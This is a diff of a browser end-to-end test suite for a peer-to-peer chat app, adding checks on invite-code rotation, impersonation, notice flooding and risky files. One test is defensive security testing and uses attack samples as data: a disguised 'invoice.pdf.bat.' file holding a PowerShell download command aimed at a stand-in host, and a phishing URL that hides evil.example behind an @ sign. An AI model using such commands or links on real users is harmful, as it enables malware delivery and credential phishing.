@@ -71,6 +71,7 @@ async function pair(nameA = 'Alice', nameB = 'Bob', vpB) {
   await B.waitForSelector('#chat.is-on', { timeout: 20000 });
   return { A, B, code };
 }
+const current = (p) => p.evaluate(() => window.__ghost.session.inviteCode);
 async function say(p, text) { await p.fill('#input', text); await p.press('#input', 'Enter'); }
 const lastThem = (p) => p.locator('.msg.them .bubble span:not(.quote)').last();
 const sha = (buf) => createHash('sha256').update(buf).digest('hex');
@@ -143,10 +144,9 @@ await test('peer-supplied HTML/script is rendered inert', async () => {
     links: [...document.querySelectorAll('.bubble a')].map((a) => a.href),
   }));
   assert(r.pwned === undefined && r.imgs === 0, 'HTML executed or parsed');
-  assert(!r.name.includes('‮') && r.name.startsWith('<b'), 'bidi override not stripped: ' + JSON.stringify(r.name));
-  assert(r.avatar === '👤', 'unknown avatar should fall back');
+  assert(r.name === 'Alice', 'a later profile can\'t rename the peer (or inject a name): ' + JSON.stringify(r.name));
+  assert(r.avatar !== '<script>', 'avatar not taken from the peer as-is');
   assert(r.links.every((h) => h.startsWith('https:') || h.startsWith('http:')), 'non-http link created: ' + r.links);
-  await S.A.evaluate(() => window.__ghost.session.send({ t: 'profile', name: 'Alice', avatar: '👻' }));
 });
 
 await test('5 MB file transfers byte-for-byte', async () => {
@@ -175,11 +175,13 @@ await test('received images are never opened automatically; only sniffed raster 
   await S.B.waitForFunction(() => [...document.querySelectorAll('.file-sub a[download]')].some((a) => a.download === 'photo.jpg'), null, { timeout: 10000 });
   const t = await S.B.evaluate(async () => {
     const a = [...document.querySelectorAll('.file-sub a[download]')].find((x) => x.download === 'evil.svg');
+    const safe = [...document.querySelectorAll('.file-sub a[download]')].find((x) => x.download === 'photo.jpg');
     let fetchBlocked = false;
-    try { await fetch(a.href); } catch { fetchBlocked = true; }
-    return { pwned: window.__pwned, fetchBlocked, viewable: document.querySelectorAll('.msg.them .media-view').length, svgRisky: !!a.closest('.file-card.is-risky') };
+    try { await fetch(safe.href); } catch { fetchBlocked = true; }
+    return { pwned: window.__pwned, fetchBlocked, viewable: document.querySelectorAll('.msg.them .media-view').length, svgRisky: !!a.closest('.file-card.is-risky'), svgHref: a.getAttribute('href') };
   });
   assert(t.pwned === undefined, 'script ran');
+  assert(!t.svgHref, 'a risky file has no address until the person confirms');
   assert(t.fetchBlocked, 'CSP should block fetch of blob URLs');
   assert(t.viewable === 1, 'only the PNG should be viewable, got ' + t.viewable);
   assert(t.svgRisky, 'SVG should be flagged as able to run code');
@@ -260,7 +262,7 @@ await test('typing indicator appears and clears', async () => {
 
 await test('a third browser with the right room but wrong secret is refused; chat continues', async () => {
   const M = await page('Mallory');
-  const wrong = S.code.slice(0, 6) + 'AAAAA-AAAAA-AAAAA';
+  const wrong = (await current(S.A)).slice(0, 6) + 'AAAAA-AAAAA-AAAAA';
   await join(M, wrong, 'Mallory');
   await M.waitForSelector('#connectError:not([hidden])', { timeout: 20000 });
   const msg = await M.textContent('#connectErrorText');
@@ -291,7 +293,7 @@ await test('dropped link resumes automatically, proves continuity, delivers queu
 
 await test('a newcomer with the full, correct code waits for the host; Deny turns them away', async () => {
   const M = await page('Leaker');
-  await join(M, S.code, 'Leaker');
+  await join(M, await current(S.A), 'Leaker');
   await M.waitForFunction(() => /Waiting to be let in/.test(document.getElementById('connectTitle').textContent), null, { timeout: 20000 });
   assert(/Waiting for Alice to let you in/.test(await M.textContent('#peerStepText')), 'joiner told who decides: ' + await M.textContent('#peerStepText'));
   await S.A.waitForSelector('.knock-card >> text=Leaker wants to join', { timeout: 10000 });
@@ -370,6 +372,8 @@ await test('ending the session notifies the peer and wipes local state', async (
   await S.A.click('#dialogOk');
   await S.A.waitForSelector('#home.is-on');
   assert(await S.A.locator('.msg').count() === 0, 'messages not wiped');
+  const left = await S.A.evaluate(() => document.body.innerHTML.includes('Bob'));
+  assert(!left, 'the other person\'s name is left in the page after ending');
   await S.B.waitForSelector('.sys.is-bad >> text=ended the session', { timeout: 10000 });
   assert(await S.B.isDisabled('#input'), 'composer should be disabled');
   await S.A.context().close(); await S.B.context().close();
@@ -430,7 +434,7 @@ await test('invite link fragment is consumed and removed from the address bar', 
   const boxes = await P.$$eval('.code-box', (b) => b.map((x) => x.value).join('-'));
   assert(boxes === 'ABCDE-FGHJK-MNPQR-STUVW', 'code not prefilled: ' + boxes);
   assert(/invited/.test(await P.textContent('#joinTitle')), 'invite heading');
-  assert(await P.evaluate(() => document.activeElement.id) === 'joinBtn', 'join is one tap away');
+  assert(await P.evaluate(() => document.activeElement.id) === 'joinName', 'invited without a name yet: the name field is ready to type in');
   await P.context().close();
 });
 
@@ -461,7 +465,8 @@ await test('wide screen: docked panel collapses, one verify control at a time, i
   await s.A.click('#panelBtn');
   await s.A.click('#qaInvite');
   await s.A.waitForSelector('#inviteSheet:not([hidden])');
-  assert((await s.A.textContent('#invCode')).trim() === s.code, 'invite shares this room\'s code');
+  const inv = (await s.A.textContent('#invCode')).trim();
+  assert(inv === await current(s.A) && inv !== s.code, 'invite shares the room\'s current code, not the used one');
   assert(s.A.context().pages().length === 1, 'no new tab');
   await s.A.click('#inviteSheet [data-close-sheet]');
   await s.A.context().close(); await s.B.context().close();
@@ -472,7 +477,9 @@ await test('chat layout: room rail, details tabs, timer menu, message layouts', 
   const { A, B } = s;
   // Wide: the room rail is always there, with the code, people and connection.
   assert(await B.isVisible('#rail') && await B.isHidden('#railBtn'), 'rail docked on wide screens');
-  assert((await B.textContent('#railCode')).replace(/\s/g, '') === s.code.replace(/-/g, ''), 'rail shows the room code');
+  assert(await B.isHidden('.room-code'), 'members who can\'t invite don\'t see a code');
+  assert((await A.textContent('#railCode')).replace(/\s/g, '') === (await current(A)).replace(/-/g, ''), 'the host\'s rail shows the current code');
+  assert(await current(A) !== s.code, 'the code used to join was retired');
   assert(/2 of 6/.test(await B.textContent('#peoplesTitle')), 'people count in the rail');
   assert(await B.isHidden('#railInvite') && await B.isVisible('#railInviteNote'), 'members see why they can\'t invite');
   assert(await A.isVisible('#railInvite'), 'the host can invite from the rail');
@@ -539,6 +546,77 @@ await test('phone: the room rail opens as a sheet and closes with Escape', async
   await s.A.context().close(); await B.context().close();
 });
 
+await test('a hostile peer can\'t pose as you, rename itself later, flood notices, or slip a script past the file warning', async () => {
+  const { A, B } = await pair('Ada', 'Bea');
+  // Bea's real name arrived when the pair connected; a later "profile" is ignored, and "You" is never accepted.
+  await B.evaluate(() => window.__ghost.session.send({ t: 'profile', name: 'You', avatar: '👻' }));
+  await A.waitForTimeout(600);
+  const names = await A.evaluate(() => [...window.__ghost.people.values()].map((p) => p.name));
+  assert(names.length === 1 && names[0] === 'Bea', 'name frozen after the first profile: ' + names.join(','));
+  // A flood of room actions posts only a handful of notices.
+  const before = await A.locator('.sys').count();
+  await B.evaluate(() => { for (let i = 0; i < 300; i++) window.__ghost.session.send({ t: 'unsend-all' }); });
+  await A.waitForTimeout(2500);
+  const added = (await A.locator('.sys').count()) - before;
+  assert(added > 0 && added <= 12, 'notices limited per person: ' + added);
+  // A script whose name ends in a dot is still flagged, and Save has no address until confirmed.
+  await B.setInputFiles('#fileInput', { name: 'invoice.pdf.bat.', mimeType: 'text/plain', buffer: Buffer.from('powershell -c iwr evil') });
+  await A.waitForSelector('.file-card.is-received', { timeout: 15000 });
+  assert(await A.locator('.file-card.is-risky').count() === 1, 'flagged as able to run code');
+  assert(!(await A.locator('.file-card.is-risky .file-act', { hasText: 'Save' }).getAttribute('href')), 'no download address before confirming');
+  // A link that hides its real site behind an @ is called out.
+  await say(B, 'login here https://www.paypal.com@evil.example/login');
+  await A.waitForSelector('.msg.them a >> text=evil.example');
+  await A.click('.msg.them a >> text=evil.example');
+  await A.waitForSelector('#dialog:not([hidden])');
+  assert(/goes to evil\.example/.test(await A.textContent('#dialogBody')) && /@ sign/.test(await A.textContent('#dialogBody')), await A.textContent('#dialogBody'));
+  await A.click('#dialogCancel');
+  await A.context().close(); await B.context().close();
+});
+
+await test('replies to photos resolve on both screens, quotes jump to the original, an ended chat locks the composer', async () => {
+  const { A, B } = await pair('Rae', 'Sam');
+  const png = Buffer.from('89504e470d0a1a0a0000000d4948445200000001000000010806000000' + '1f15c4890000000d49444154789c6360000002000154a24f5d0000000049454e44ae426082', 'hex');
+  await say(B, 'first message');
+  await A.waitForSelector('.msg.them >> text=first message');
+  await B.setInputFiles('#fileInput', { name: 'gate.png', mimeType: 'image/png', buffer: png });
+  await A.waitForSelector('.msg.them .file-card.is-received', { timeout: 15000 });
+  await A.locator('.msg.them .file-card').last().click({ button: 'right' });
+  await A.click('#msgMenu [data-act="reply"]');
+  assert(/Photo · gate\.png/.test(await A.textContent('#replyText')), 'reply bar names the photo: ' + await A.textContent('#replyText'));
+  await say(A, 'which gate?');
+  await B.waitForSelector('.msg.them >> text=which gate?');
+  const q = await B.textContent('.msg.them .quote');
+  assert(/Photo · gate\.png/.test(q) && !/no longer here/.test(q), 'the photo reply resolves on the sender\'s screen: ' + q);
+  // Clicking a quote brings the original into view and highlights it.
+  await B.click('.msg.them .quote');
+  await B.waitForSelector('.msg.me.flash', { timeout: 2000 });
+  // The verify button is an action while there's someone to verify.
+  assert(/Verify identity/.test(await A.textContent('#verifyChip')), await A.textContent('#verifyChip'));
+  await A.click('#panelBtn'); await A.click('[data-ptab="safety"]'); await A.click('#endBtn'); await A.click('#dialogOk');
+  await B.waitForSelector('#chat.composer-locked', { timeout: 10000 });
+  assert(await B.isDisabled('#input') && await B.isDisabled('#attachBtn') && await B.isDisabled('#timerBtn'), 'everything in the composer is disabled');
+  assert(/ended/.test(await B.getAttribute('#input', 'placeholder')), 'the message box says why');
+  assert(await B.isHidden('#verifyChip'), 'nothing to verify once the chat has ended');
+  await A.context().close(); await B.context().close();
+});
+
+await test('info pages: follow the app\'s theme through the link, then carry it on', async () => {
+  const P = await page('Pages');
+  await P.click('#themeBtn'); await P.click('#themeSheet [data-t="haven"]'); await P.click('#themeSheet [data-close-sheet]');
+  await P.click('.home-links a[href^="guide"]');
+  await P.waitForURL(/guide\.html$/);
+  assert(await P.evaluate(() => document.documentElement.dataset.theme) === 'haven', 'guide opened in Haven');
+  assert(!(await P.evaluate(() => location.hash)), 'the fragment was removed');
+  await P.click('.pt-btn'); await P.click('.pt-grid [data-t="vault"]');
+  assert(await P.evaluate(() => document.documentElement.dataset.theme) === 'vault', 'picker on the page works');
+  await P.click('.nav a[href^="index"]');
+  await P.waitForSelector('html.booted #home.is-on');
+  assert(await P.evaluate(() => document.documentElement.dataset.theme) === 'vault', 'back in the app with the theme picked on the page');
+  assert(await P.locator('#joinScreen.is-on').count() === 0, 'a theme in the link is never taken for an invite');
+  await P.context().close();
+});
+
 await test('refuses to run inside a frame (click-jacking guard)', async () => {
   const ctx = await browser.newContext();
   const p = await ctx.newPage();
@@ -590,11 +668,11 @@ await test('someone who reloaded asks to join again; the host lets them in with 
   await s.B.context().close();                                  // guest "reloads": its keys are gone
   await s.A.waitForSelector('#banner:not([hidden])', { timeout: 15000 });
   const G = await page('Guest again');
-  await join(G, s.code, 'Guest');
-  await s.A.waitForSelector('.knock-card >> text=Guest wants to join', { timeout: 20000 });
+  await join(G, await current(s.A), 'Guest');
+  await s.A.waitForSelector('.knock-card >> text=/Guest.* wants to join/', { timeout: 20000 });
   await s.A.click('.knock-card >> text=Let in');
   await G.waitForSelector('#chat.is-on', { timeout: 30000 });
-  await s.A.waitForSelector('.sys.is-good >> text=Guest joined', { timeout: 10000 });
+  await s.A.waitForSelector('.sys.is-good >> text=/Guest.* joined/', { timeout: 10000 });
   await s.A.waitForSelector('#banner', { state: 'hidden', timeout: 10000 });
   const sn1 = await G.getAttribute('#safetyNumber', 'data-value');
   const hostHas = await s.A.evaluate(() => [...window.__ghost.people.values()].filter((p) => p.ready).map((p) => p.sn));
@@ -610,7 +688,7 @@ const nameSn = (p) => p.evaluate(() => Object.fromEntries([...window.__ghost.peo
 async function trio() {
   const s = await pair('Ann', 'Ben');
   const C = await page('Cat');
-  await join(C, s.code, 'Cat');
+  await join(C, await current(s.A), 'Cat');
   await s.A.waitForSelector('.knock-card >> text=Cat wants to join', { timeout: 20000 });
   await s.A.click('.knock-card >> text=Let in');
   await C.waitForSelector('#chat.is-on', { timeout: 30000 });
@@ -700,6 +778,8 @@ await test('groups: the host decides who may invite, and can remove someone', as
   await C.click('#qaInvite');
   await C.waitForSelector('#inviteSheet:not([hidden])');
   assert(/Ann \(the host\) decides/.test(await C.textContent('#invNote')), await C.textContent('#invNote'));
+  const catSaw = (await C.textContent('#invCode')).trim();
+  assert(catSaw && catSaw === await current(A), 'a member allowed to invite gets the current code');
   await C.click('#inviteSheet [data-close-sheet]');
   await A.click('.pp-row:has-text("Cat") .pp-btn.is-danger');
   await A.click('#dialogOk');
@@ -709,6 +789,13 @@ await test('groups: the host decides who may invite, and can remove someone', as
   await say(A, 'just us two');
   await B.waitForFunction(() => document.querySelector('.msg.them:last-child .bubble')?.textContent === 'just us two', null, { timeout: 8000 });
   assert(await C.locator('.msg.them .bubble', { hasText: 'just us two' }).count() === 0, 'removed member gets nothing new');
+  assert(await current(A) !== catSaw, 'removing someone retires the code they knew');
+  // Cat still has the old code: it no longer reaches the room, so Cat can't greet a newcomer as the host.
+  const X = await page('Late');
+  await join(X, catSaw, 'Late');
+  await X.waitForSelector('#connectError:not([hidden])', { timeout: 30000 });
+  assert(/isn.t open with this code/.test(await X.textContent('#connectErrorText')), await X.textContent('#connectErrorText'));
+  await X.context().close();
   for (const p of [A, B, C]) await p.context().close();
 });
 
